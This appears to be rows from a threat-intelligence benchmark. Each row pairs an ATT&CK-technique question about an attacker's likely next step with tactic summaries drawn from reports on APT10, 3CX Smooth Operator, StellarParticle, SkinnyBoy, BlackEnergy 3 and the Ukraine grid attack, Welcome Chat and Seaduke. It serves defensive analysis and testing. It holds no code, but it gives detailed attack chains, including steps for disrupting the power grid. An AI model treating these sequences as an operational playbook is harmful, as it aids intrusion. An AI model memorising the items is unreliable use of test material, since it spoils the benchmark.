Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",Yes,cloud-hopper-report-final-v4
1933,342,342-Persistence-T1505-Server Software Component,"After executing as part of the 3CX software by creating a new thread to run its functionality, is Smooth Operator likely to persist by abusing the legitimate 3CX software package and ensuring execution every time libffmpeg.dylib is loaded before employing defense evasion techniques such as daemonizing the second-stage payload UpdateAgent and writing configuration files to the 3CX installation directory to appear legitimate?","Persistence: Smooth Operator persists by abusing a legitimate component of the 3CX software package, ensuring it runs every time the libffmpeg.dylib is loaded.","Initial Access: Smooth Operator malware, targeting macOS, was distributed via a supply chain attack involving 3CX software. The infected software package was signed by 3CX and notarized by Apple. Malicious code was inserted into a dynamic library (dylib) within the 3CX software, which then downloads and executes a second-stage payload.
Execution: Smooth Operator malware executes as part of the 3CX software. It creates a new thread to run its functionality and uses a constructor function within the dylib to initiate without affecting the normal usage of the library.
Defense Evasion: Smooth Operator employs several defense evasion techniques. The second-stage payload, UpdateAgent, daemonizes and detaches from the 3CX process. It also deletes itself from disk immediately after execution. The malware writes configuration files and executable stages to the legitimate 3CX installation directory to appear legitimate. Traffic to the C2 server is obfuscated with a custom data encoding algorithm.
Discovery: Smooth Operator collects information from the victim machine, including the OS version from the SystemVersion.plist file and domain and account name values from the 3CX file config.json. This data is included in beacons or exfiltration.
Collection: Smooth Operator stages collect data from the victim machine to be included in a beacon or exfiltration. It extracts the OS version, hostname, beacon interval, and C2 index, which are included in every beacon. The second-stage payload UpdateAgent parses and extracts domain and account name values from the 3CX file config.json for exfiltration.
Command and Control: Smooth Operator communicates with its C2 servers over HTTPS, using a custom data encoding algorithm for obfuscation. It contains multiple C2 servers and randomly chooses a new server for each beacon. If one fails, it will try another.
Exfiltration: Smooth Operator automatically exfiltrates collected data, not over the existing C2 channel. The second-stage payload exfiltrates victim-specific data from a 3CX installation file and the victim ID generated by the first-stage via a HTTP GET request over HTTPS.
Others: Smooth Operator targets macOS and infects victims when they install specific trojanised versions of the 3CX software. It implements a file lock to ensure only one instance is running and generates a unique victim ID. The malware sleeps for 7 to 20 days before beaconing and uses a time-seeded random algorithm to generate beacon intervals. It has an embedded list of 15 C2s and one URL for the 3CX website, all obfuscated. The malware maintains a beacon error count and has taskable functionality supported by command IDs. The second-stage payload is lightweight and likely meant to determine which victims to pursue with further stages.",Yes,NCSC_MAR-Smooth-Operator
1957,345,345-Persistence-T1078-Valid Accounts,"After gaining initial access to the network through SSH using stolen local accounts and establishing RDP sessions via port forwarding, is the StellarParticle campaign likely to use credential hopping and Delegated Administrator rights for persistence before evading defenses by stealing browser cookies to bypass multifactor authentication?","Persistence: The StellarParticle campaign demonstrated persistence by using credential hopping, where different credentials were leveraged for each step while moving laterally through the victim's network. They also used accounts with Delegated Administrator rights to access other O365 tenants and create persistence within the environment. TrailBlazer malware was configured for WMI persistence, and GoldMax malware was configured for persistence via a crontab entry. The threat actor added credentials to O365 Service Principals and created new O365 Service Principals to maintain access to victim's environments.","Initial Access: The StellarParticle campaign, associated with COZY BEAR, utilized various initial access techniques. They gained access to the victim's network by logging into a public-facing system via Secure Shell (SSH) using a local account acquired during previous credential theft activities. They also used port forwarding capabilities to establish a Remote Desktop Protocol (RDP) session to internal servers using different domain accounts. Additionally, the threat actor used VPNs to gain access to systems and persist in the environment. They exported saved passwords from users' Chrome browser installations.
Defense Evasion: The StellarParticle campaign involved defense evasion techniques such as stealing browser cookies to bypass multifactor authentication (MFA) and using renamed utilities to masquerade as legitimate system binaries. They also renamed their systems prior to connecting to victim's VPNs to match the victim's system naming convention.
Credential Access: The StellarParticle campaign involved various credential access techniques. They stole web session cookies from end-user workstations to access cloud resources and used both privileged and non-privileged accounts for RDP throughout the environment. They also used compromised service principals to make changes to the Office 365 environment and accessed data from Information Repositories.
Discovery: The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory. They regularly interrogated other systems using tasklist.exe and probed external services in an attempt to regain access to the environment.
Lateral Movement: The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system.
Collection: The threat actor accessed data from Information Repositories.",Yes,APT29_StellarParticle-Campaing_CrowdStrike
1958,345,345-Persistence-T1543-Create or Modify System Process,"After utilizing various initial access methods such as logging into a public-facing system using SSH with stolen credentials and employing VPNs to persist in the victim's environment, is it likely that the StellarParticle campaign will configure TrailBlazer malware for WMI persistence and GoldMax malware for persistence via a crontab entry before conducting defense evasion by stealing browser cookies to bypass multifactor authentication (MFA)?","Persistence: The StellarParticle campaign demonstrated persistence by using credential hopping, where different credentials were leveraged for each step while moving laterally through the victim's network. They also used accounts with Delegated Administrator rights to access other O365 tenants and create persistence within the environment. TrailBlazer malware was configured for WMI persistence, and GoldMax malware was configured for persistence via a crontab entry. The threat actor added credentials to O365 Service Principals and created new O365 Service Principals to maintain access to victim's environments.","Initial Access: The StellarParticle campaign, associated with COZY BEAR, utilized various initial access techniques. They gained access to the victim's network by logging into a public-facing system via Secure Shell (SSH) using a local account acquired during previous credential theft activities. They also used port forwarding capabilities to establish a Remote Desktop Protocol (RDP) session to internal servers using different domain accounts. Additionally, the threat actor used VPNs to gain access to systems and persist in the environment. They exported saved passwords from users' Chrome browser installations.
Defense Evasion: The StellarParticle campaign involved defense evasion techniques such as stealing browser cookies to bypass multifactor authentication (MFA) and using renamed utilities to masquerade as legitimate system binaries. They also renamed their systems prior to connecting to victim's VPNs to match the victim's system naming convention.
Credential Access: The StellarParticle campaign involved various credential access techniques. They stole web session cookies from end-user workstations to access cloud resources and used both privileged and non-privileged accounts for RDP throughout the environment. They also used compromised service principals to make changes to the Office 365 environment and accessed data from Information Repositories.
Discovery: The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory. They regularly interrogated other systems using tasklist.exe and probed external services in an attempt to regain access to the environment.
Lateral Movement: The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system.
Collection: The threat actor accessed data from Information Repositories.",Yes,APT29_StellarParticle-Campaing_CrowdStrike
1974,348,348-Reconnaissance-T1591-Gather Victim Org Information,"After using phishing emails as an initial point of intrusion to further phishing campaigns within a client's supply chain, is it likely that threat actors targeting Solar Winds and Kaseya cyber-attacks will gather victim organization information during their reconnaissance efforts?","Reconnaissance: The CTI report indicates that phishing emails have been a common attack vector, with a noted shift towards malware propagation leading to ransomware attacks. There has been a decrease in incidents caused by lost devices, reflecting the impact of lockdown and travel restrictions. Vulnerabilities in VPNs and remote desktop protocols have been more readily exploited due to remote working. The report also mentions third-party/supply chain issues, highlighting the Solar Winds and Kaseya cyber-attacks where malware was inserted into software updates, creating backdoors for further attacks. Additionally, the report discusses the importance of good logging processes to understand the point of intrusion and impacted data, despite sophisticated threat actors' anti-forensic efforts to erase logs.","Initial Access: The CTI report discusses the use of phishing emails as an initial point of intrusion for various cyber attacks, including further phishing campaigns and payment diversion fraud attempts. Attackers have used sophisticated methods, such as sending phishing emails from genuine accounts within a client's supply chain. The report emphasizes the importance of multi-factor authentication, robust backups, and network segregation to protect against lateral movement by attackers.
Exfiltration: The CTI report describes ransomware attacks where attackers first gain access to systems, exfiltrate data, and then encrypt it, demanding payment for a decryption key and threatening to publish the stolen data. The report notes that the ICO has seen an increase in reported ransomware cases and emphasizes the importance of having policies and procedures in place to respond to attacks.
Others: The CTI report discusses the increase in data subject litigation following cyber incidents, with a focus on the UK Supreme Court decision in Lloyd v Google, which may influence the risk of mass actions. It also mentions the importance of being prepared for a cyber-attack, including having incident response and business recovery plans. The report highlights the global increase in ransomware attacks and the potential legal implications of making ransom payments, particularly in relation to OFAC advisories in the US. Additionally, the report covers the rise of data subject claims in the UK and the potential impact of the EU Collective Redress Directive on mass actions across Europe.",Yes,Pinsent Masons - Cyber Report 2021
1975,348,348-Initial Access-T1566-Phishing,"After exploiting vulnerabilities in remote desktop protocols as part of reconnaissance activities, is it likely that attackers will leverage phishing emails originating from genuine accounts within a client's supply chain for gaining initial access before attempting to exfiltrate sensitive data during ransomware attacks?","Initial Access: The CTI report discusses the use of phishing emails as an initial point of intrusion for various cyber attacks, including further phishing campaigns and payment diversion fraud attempts. Attackers have used sophisticated methods, such as sending phishing emails from genuine accounts within a client's supply chain. The report emphasizes the importance of multi-factor authentication, robust backups, and network segregation to protect against lateral movement by attackers.","Reconnaissance: The CTI report indicates that phishing emails have been a common attack vector, with a noted shift towards malware propagation leading to ransomware attacks. There has been a decrease in incidents caused by lost devices, reflecting the impact of lockdown and travel restrictions. Vulnerabilities in VPNs and remote desktop protocols have been more readily exploited due to remote working. The report also mentions third-party/supply chain issues, highlighting the Solar Winds and Kaseya cyber-attacks where malware was inserted into software updates, creating backdoors for further attacks. Additionally, the report discusses the importance of good logging processes to understand the point of intrusion and impacted data, despite sophisticated threat actors' anti-forensic efforts to erase logs.
Exfiltration: The CTI report describes ransomware attacks where attackers first gain access to systems, exfiltrate data, and then encrypt it, demanding payment for a decryption key and threatening to publish the stolen data. The report notes that the ICO has seen an increase in reported ransomware cases and emphasizes the importance of having policies and procedures in place to respond to attacks.
Others: The CTI report discusses the increase in data subject litigation following cyber incidents, with a focus on the UK Supreme Court decision in Lloyd v Google, which may influence the risk of mass actions. It also mentions the importance of being prepared for a cyber-attack, including having incident response and business recovery plans. The report highlights the global increase in ransomware attacks and the potential legal implications of making ransom payments, particularly in relation to OFAC advisories in the US. Additionally, the report covers the rise of data subject claims in the UK and the potential impact of the EU Collective Redress Directive on mass actions across Europe.",Yes,Pinsent Masons - Cyber Report 2021
1978,349,349-Resource Development-T1584-Compromise Infrastructure,"After sending emails with diplomatic themes containing a PDF link to ENVYSCOUT during the Initial Access phase, is it likely that the adversary will use compromised webservers to host ENVYSCOUT delivery scripts and VPSs to host malware C2s during the Resource Development phase?",Resource Development: Resource Development T1583.003 T1584  Virtual Private Server Compromise Infrastructure The adversary used compromised webservers to host ENVYSCOUT delivery scripts  The adversary used VPSs to host malware C2s,"Initial Access: Initial Access T1566 T1566.001  The adversary sent emails that used diplomatic themes Phishing Spearphishing Attachment The adversary sent emails with a PDF attachment.  The PDF contained a link to ENVYSCOUT
Execution: Execution T1204  User Execution  T1204.002  Malicious File  The adversary relies on tricking users into executing malware The adversary used malicious DLL DLL Hijacking to execute malware loaded via
Persistence: Persistence T1547.001  T1574.001  Registry Run Keys Startup Folder DLL Search Order Hijacking  T1574.002  DLL Side-Loading  The adversary used the Run registry key to maintain persistence The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL
Defense Evasion: Defense Evasion T1027.006  HTML Smuggling  T1140  T1553.005  Deobfuscate/Decode Files or Information Mark-of-the-Web Bypass  T1574.001  DLL Search Order Hijacking  T1574.002  DLL Side-Loading  ENVYSCOUT delivery script uses HTML Smuggling to bypass security controls The adversary uses obfuscation to protect sensitive information (i.e. strings). The adversary abuses container files such as ISO to deliver malicious payloads that are not tagged with MOTW The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL",Yes,HALFRIG_
1986,349,349-Defense Evasion-T1553-Subvert Trust Controls,"After sending diplomatic-themed phishing emails with a PDF attachment that links to ENVYSCOUT, is the adversary likely to utilize HTML Smuggling via ENVYSCOUT delivery scripts and employ obfuscation techniques before achieving persistence by planting a legitimate binary that loads a malicious DLL?",Defense Evasion: Defense Evasion T1027.006  HTML Smuggling  T1140  T1553.005  Deobfuscate/Decode Files or Information Mark-of-the-Web Bypass  T1574.001  DLL Search Order Hijacking  T1574.002  DLL Side-Loading  ENVYSCOUT delivery script uses HTML Smuggling to bypass security controls The adversary uses obfuscation to protect sensitive information (i.e. strings). The adversary abuses container files such as ISO to deliver malicious payloads that are not tagged with MOTW The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL,"Resource Development: Resource Development T1583.003 T1584  Virtual Private Server Compromise Infrastructure The adversary used compromised webservers to host ENVYSCOUT delivery scripts  The adversary used VPSs to host malware C2s
Initial Access: Initial Access T1566 T1566.001  The adversary sent emails that used diplomatic themes Phishing Spearphishing Attachment The adversary sent emails with a PDF attachment.  The PDF contained a link to ENVYSCOUT
Execution: Execution T1204  User Execution  T1204.002  Malicious File  The adversary relies on tricking users into executing malware The adversary used malicious DLL DLL Hijacking to execute malware loaded via
Persistence: Persistence T1547.001  T1574.001  Registry Run Keys Startup Folder DLL Search Order Hijacking  T1574.002  DLL Side-Loading  The adversary used the Run registry key to maintain persistence The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL",Yes,HALFRIG_
1995,35,35-Collection-T1119-Automated Collection,"After SkinnyBoy conducts discovery activities by extracting the volume serial number and enumerating user-specific directories and AppData folders, is it likely to automate the collection of data using the CryptBinaryToStringA API for encoding before sending the collected information to the C2 server via an HTTP POST request?","Collection: SkinnyBoy collects data by base64 encoding the output of the systeminfo and tasklist commands, along with the list of targeted directories and their content, using the CryptBinaryToStringA API.","Execution: The SkinnyBoy malware, attributed to APT28/Sofacy, executes by creating an unnamed event object and two new threads. It uses the GetMessage routine to process messages and breaks the loop if the message is WM_ENDSESSION. The malware creates an anonymous pipe and uses GetStartupInfoA to retrieve the STARTUPINFO structure. It then creates a new process to run the systeminfo command, using the pipe for inter-process communication. The output is read via ReadFile. Similarly, it retrieves the list of processes by running the tasklist command and reading the output.
Defense Evasion: SkinnyBoy employs defense evasion by using the GetTempPathW API to retrieve the path of the %TEMP% directory and initializing the use of WinINet functions with the InternetOpenW API, setting the user agent to ""Opera"". It sets send and receive timeouts to 600 seconds using InternetSetOptionW. The malware establishes a connection to the C2 server updaterweb[.]com on port 443, and if it fails, it tries port 80. It uses the HttpOpenRequestW routine to create an HTTP POST request handle and adds an HTTP request header.
Discovery: SkinnyBoy conducts discovery by enumerating files and directories from the Desktop directory using FindFirstFileW and FindNextFileW functions. It targets directories such as 'C:\Program Files', 'C:\Program Files (x86)', and various user-specific AppData folders. The SHGetFolderPathW function is used to obtain folder names, and the GetComputerNameA and GetUserNameA APIs are used to retrieve the NetBIOS name of the local computer and the name of the user associated with the current thread, respectively. The malware also extracts the volume serial number of the root directory using GetVolumeInformationW.
Command and Control: The malware communicates with the C2 server updaterweb[.]com, sending exfiltrated data in a POST request with the structure ""id=<hostname>#Username#<Serial number in decimal>&current=1&total=1&data=<base-64 encoded data>"". It also downloads a DLL file from the C2 server, which is loaded using the LoadLibraryW API, and executes the first ordinal function.
Exfiltration: SkinnyBoy exfiltrates collected information to the C2 server updaterweb[.]com using an HTTP POST request with the structure ""id=<hostname>#Username#<Serial number in decimal>&current=1&total=1&data=<base-64 encoded data>"".
Others: The malware uses the CryptAcquireContextA function to acquire a handle to the Microsoft RSA and AES Cryptographic Provider and the CryptCreateHash routine to create a hash object. It verifies the hash value of a downloaded DLL file against a provided buffer. The malware creates a file called fvjoik.dll in the %TEMP% directory, populates it with the DLL downloaded from the C2 server, and executes an exported function with ordinal 1. After execution, it uses WinExec to delete the DLL file. The main thread retrieves the termination status of the two threads using the GetExitCodeThread API.",Yes,A step-by-step analysis of the new malware used by APT28_Sofacy called SkinnyBoy – CYBER GEEKS
2006,351,351-Execution-T1059-Command and Scripting Interpreter,"After reconnaissance activities such as gathering publicly available information on systems and conducting active discovery methods, is it likely that malicious implants like BlackEnergy 3 will establish communication with Command-and-Control servers after being installed on the network through employee-enabled macro execution?","Execution: Step 4: Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Employee-enabled malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: In a social engineering attack, employees are prompted to enable macros when opening the file attached to phishing email. Once macros are enabled, the VBA script places multiple malicious files on the workstation, unbeknown to the employee. Impact: Files placed on workstations within the corporate network can begin the communication process with external Command and Control (CC) servers.","Reconnaissance: Step 1: Reconnaissance and Intelligence Gathering. Before the attack, adversaries likely begin open-source intelligence gathering and reconnaissance on potential targets. Location: External infrastructure Action: Active threat actor activity Timeline: May 2014 or earlier Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: Adversaries likely gather publicly available information on deployed systems and network architecture, and may also use active discovery methods such as scanning of perimeter devices, enumeration of devices, social media data collection and analysis for future targeting
Initial Access: Step 3: Deliver Remote Access Trojan (RAT) Adversaries initiate phishing campaign against electricity distributors. Step 4: Install RAT. Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Active threat actor activity Timeline: May 2014-June 2015e Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other IT services used in business operations. Exploitation method: Adversaries send targeted emails containing the modified MS Office files as attachments to users on targeted networks. Impact: RAT is delivered to targeted network, but not installed. Installation requires employees to actively grant permission to the embedded VBA scripts to execute.
Credential Access: Step 7: Harvest Credentials. Delivered BE3 malware plugins conduct credential harvesting and network discovery functions. Delivered BlackEnergy 3 malware plugins conduct credential harvesting and network discovery functions. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Windows OS workstations, Windows domain controllers, virtual private network (VPN) service deployed in control environment Role in infrastructure: These systems support business operations, manage permissions and domain access, and provide remote network access respectively. Exploitation method: Adversaries use delivered BlackEnergy 3 plugins to gather stored credentials or log keystrokes. After gathering valid credentials for user with administrator privileges, adversaries use the stolen administrator credentials to access the domain controller, recover additional credentials, and create new privileged accounts. Impact: Adversaries obtain valid credentials enabling them to expand access across the corporate network and into the control environment, ensure persistent access, and blend into regular network traffic.
Discovery: Step 8: Lateral Movement and Target Identification on Corporate Network Adversaries conduct internal reconnaissance on corporate network to discover potential targets and expand accessed. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Discovered systems, including networked uninterruptable power supply (UPS) devices, data center servers, a telephone communications server, and employee workstations Role in infrastructure: Internal reconnaissance efforts could potentially include all deployed devices on the corporate network. Exploitation method: Adversaries likely use a combination of valid user credentials and BlackEnergy 3 plugins developed to conduct network discovery. VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish remote connections to workstations and servers. Impact: Adversaries can enumerate the systems deployed across the network, identify targets, and begin preparations for final attack. Step 9: Lateral Movement and Target Identification on ICS network Adversaries use stolen credentials to access the control environment and conduct reconnaissance on deployed systems. Location: ICS network Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Discovered systems, including human machine interface (HMI) workstations, distributed management system (DMS) servers, UPS devices, 52 serial-to-Ethernet converters (Moxa UC 7408-LX-Plus, 53 IRZRUH2 3G54), remote terminal unit (RTU) devices (ABB RTU560 CMU-02), and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. UPS devices condition incoming power to downstream devices and provide temporary battery backup power. Serial-to-Ethernet converters convert serial data from field devices to digital packets, enabling communications with the control center. RTU devices function as a communication processor or a data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to interact directly with the client application for the DMS server via a VPN, and native remote access services to access employee workstations hosting HMI applications. This access likely enables adversaries to enumerate all networked devices within the control environment. Impact: Adversaries gain access to critical systems, enabling them to begin target selection and preparations for final attack.
Command and Control: Step 5: Establish CC Connection. Malware establishes connection from the malicious implant on the targeted network to attacker-controlled CC server. Location: Corporate network Action: Malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: The external connection is established as part of the execution routine following installation of the malicious files. Once permissions to execute macros are granted by employees, the malicious VBA script installs the malware implant, and the implant attempts to communicate with an external server via HTTP requests. Impact: Adversaries gain unauthorized access to targeted networks, including the ability to deliver additional BlackEnergy plugins to enable internal network reconnaissance and credential harvesting.
Impact: Step 10: Develop Malicious Computer Code. Adversaries develop malicious computer code update for identified serial-to-Ethernet converters. Location: External infrastructure Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: After identifying deployed converts, adversaries begin a malware development and testing effort on infrastructure outside of the targeted network. Impact: Upon completion of this step, adversaries would have target-specific malware designed to disrupt communications with field devices by disabling deployed converters. Step 11: Deliver Data Destruction Malware. Adversaries likely deliver KillDisk malware to a network share and set policy on the domain controller to retrieve malware and execute upon system reboot. Location: Corporate and ICS network Action: Active threat actor activity Timeline: December 2015, directly preceding attack Device/application: Network share and Windows domain controller server Role in infrastructure: The network share provides access to shared digital resources, and the Windows domain controller manages access control throughout the network. Exploitation method: Adversaries likely use stolen credentials to place KillDisk malware on a network share, then set the retrieval and execution of the malicious files by implementing a policy on the compromised domain controller server. Impact: Prescheduling execution of malware enables coordination of multiple attack components, such that data destruction coincides with or shortly follows attacks against breakers. Step 12: Schedule Uninterruptable Power Supply (UPS) Disruption. Adversaries schedule unauthorized outage of UPS for telephone communication server and data center servers. Location: Corporate and ICS network Action: Active threat actor activity Timeline: Directly preceding December 2015 attack Device/application: Networked UPS devices with remote management interface Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries likely use valid credentials to access privileged employee accounts, then use this access to remotely schedule unauthorized power outages. Impact: Prescheduling outages enables coordination of multiple attack components, such that critical systems also go down because of the power outages, stifling potential restoration efforts. Step 13: Trip Breakers. Adversaries use native remote access services and valid credentials to open breakers and disrupt power distribution to over 225,000 customers within three distribution areas. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during Device/application: HMI workstations, DMS servers, RTU, and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to seize control of operator workstations, access DMS client application via VPN, and issue unauthorized commands to breakers at substations. Impact: Opening of breakers results in disruption of electricity service to customers. Step 14: Sever Connection to Field Devices. After opening the breakers, adversaries deliver malicious computer code update to serial-to-Ethernet communications devices. The malicious updates render the converters inoperable, and sever connections between the control center and the substations. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during attack Device/application: Serial-to-Ethernet converters (Moxa UC 7408-LX-Plus,55 IRZRUH2 3G56) Role in infrastructure: Convert serial data from field devices to digital packets to be transmitted to remote monitoring and administration systems within the control network. Exploitation method: Adversaries use network access to push the malicious update over the network to targeted devices. Impact: Operators are unable to remotely close the breakers, requiring workers to manually close breakers at each substation. Forcing this manual response draws out recovery time Step 15: Telephony Denial-of-Service Attack. Adversaries initiate DoS attack on telephone call center at one of the targeted distributors. Location: Corporate network Action: Likely automated process Timeline: Dec 23, 2015, during attack Device/application: Operator telephone call center Role in infrastructure: Receive external telephone communications from customers. Exploitation method: Adversaries likely use automated IP-based call generators to flood the targeted call center. Impact: Automated calls overwhelm resources at call center, blocking legitimate communications from customers. Step 16: Disable Critical Systems via UPS Outage. Previously scheduled UPS outage cuts power to targeted telephone communications server and data center servers. Location: Corporate and ICS network Action: Execution of prescheduled process Timeline: December 23, 2015, during attack Device/application: Networked UPS devices with remote management interface, telephone communications server, and data center servers Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries use network access to schedule the temporary backup power to be offline at the time of the power outages. Impact: Power loss to telephone server disrupts communications across remote sites, and disruptions at control centers inhibit ability to monitor and respond to attack against breakers. The disruption at the data center and associated system reboot trigger execution of KillDisk malware. Step 17: Destroy Critical System Data. Scheduled execution of KillDisk malware erases the master boot records and deletes system log data on targeted machines across the victims' corporate and ICS network. Location: Corporate network and ICS network Action: Malware execution Timeline: December 23, 2015, during attack Device/application: RTU device (ABB RTU560 CMU-02),57 servers and workstations used by management, human resources (HR), and finance staff Role in infrastructure: The RTU functions as a communication processor or data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center.58 Servers and workstations are used by management, HR, and finance staff to conduct business administration operations. Exploitation method: Malware is retrieved from the network share and executed on networked devices according to direction received via domain controller policy or local Windows Task Scheduler. Impact: Targeted systems are rendered inoperable, and critical data is destroyed.",Yes,intelligence-games-in-the-power-grid-2016
2019,352,352-Collection-T1123-Audio Capture,"After collecting device information and GPS location via the Welcome Chat app, is it likely that the app will send recorded phone calls to its C&C server for exfiltration purposes before establishing a routine of contacting the C&C server every five minutes to upload additional data?","Collection: The Welcome Chat app has the capability to exfiltrate sent and received SMS messages, call log history, contact list, user photos, recorded phone calls, and the GPS location of the device.","Initial Access: We discovered a new operation within a long-running cyber-espionage campaign in the Middle East. The operation targets Android users via the malicious Welcome Chat app, which is linked to the malware named BadPatch and the Gaza Hackers threat actor group, also known as Molerats. The app is advertised on a dedicated website in Arabic, suggesting a focus on Arabic-speaking users. The domain for this website was registered in October 2019.
Persistence: The Welcome Chat app is designed to auto-start at device boot by listening for the BOOT_COMPLETED broadcast, ensuring that its functionality is activated every time the device starts.
Discovery: The Welcome Chat app collects information about the device, including device info and GPS location.
Command and Control: The Welcome Chat app sends information about the device to its command and control (C&C) server and is ready to receive commands. It contacts the C&C server every five minutes and uploads exfiltrated data using the HTTP protocol.
Others: The Welcome Chat app, which claims to be a secure messaging platform, is actually a functioning chat app with hidden espionage capabilities. It was never available on the official Android app store and requires permissions that are intrusive but may seem natural for a messaging app. The app's infrastructure was not built with security in mind, leaving harvested data from victims freely available on the internet via an unsecured server. The malicious code in the app appears to be copied from publicly available open-source projects and code snippets. The espionage app is believed to be developed by the attackers rather than being a trojanized version of a legitimate app. The campaign is linked to the threat actors behind the long-term BadPatch campaign. ESET researchers recommend not installing apps from outside the official Google Play store and to be cautious of app permissions.",Yes,Welcome Chat as a secure messaging app_ Nothing could be further from the truth _ WeLiveSecurity
2024,353,353-Command and Control-T1001-Data Obfuscation,"After employing Kerberos pass-the-ticket attacks for credential access, is it likely that Seaduke will communicate with the C&C server using multiple layers of encoding and encryption before archiving and exfiltrating sensitive data via legitimate cloud services?","Command and Control: Seaduke operates by securely communicating with the command-and-control (C&C) server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). The attackers can control Seaduke in a similar fashion to Cozyduke, with the Seaduke control infrastructure being essentially distinct, allowing for the possibility of sub-teams concurrently exploiting the target network.","Initial Access: Symantec has identified that the Duke group, using Trojan.Cozer (aka Cozyduke), initiated their campaign as early as March 2014, targeting a private research institute in Washington, D.C. The group employed tactics such as sending 'Office Monkeys'- and 'eFax'-themed emails containing a Cozyduke payload to compromise high-profile government networks. These emails were used as a smokescreen to hide the true intent of the attacks.
Defense Evasion: Seaduke, a low-profile information-stealing Trojan, is capable of hiding behind multiple layers of encryption and obfuscation. It is designed to quietly steal and exfiltrate sensitive information such as emails from the victim's computer. Seaduke has a highly configurable framework, with hundreds of different configurations found on compromised networks. The malware's communication protocol employs many layers of encryption and obfuscation, using over 200 compromised web servers for command and control.
Credential Access: The Duke group has developed additional payloads for specific attacks, including impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) and email extraction from the MS Exchange Server using compromised credentials.
Collection: The Duke group's Seaduke payload allows attackers to retrieve detailed bot/system information, update bot configuration, upload files, download files, and securely delete the malware from the system using a self-delete function named 'seppuku'.
Exfiltration: The Duke group utilizes Seaduke to archive sensitive information and exfiltrate data via legitimate cloud services, as well as to perform secure file deletion.
Others: The Duke group, responsible for the Seaduke malware, has been compromising governmental and diplomatic organizations since at least 2010. The group has a range of malware tools known as the Dukes, including Cozyduke, Miniduke, and Cosmicduke. They have mounted an extended campaign targeting high-profile networks and have sophisticated operators with fine-tuned computer network exploitation skills. The group's operational capability has reached a new level, and despite drawing significant attention, they continue to operate and are expected to reappear with potentially reworked or new tools.",Yes,Forkmeiamfamous_SeaDuke
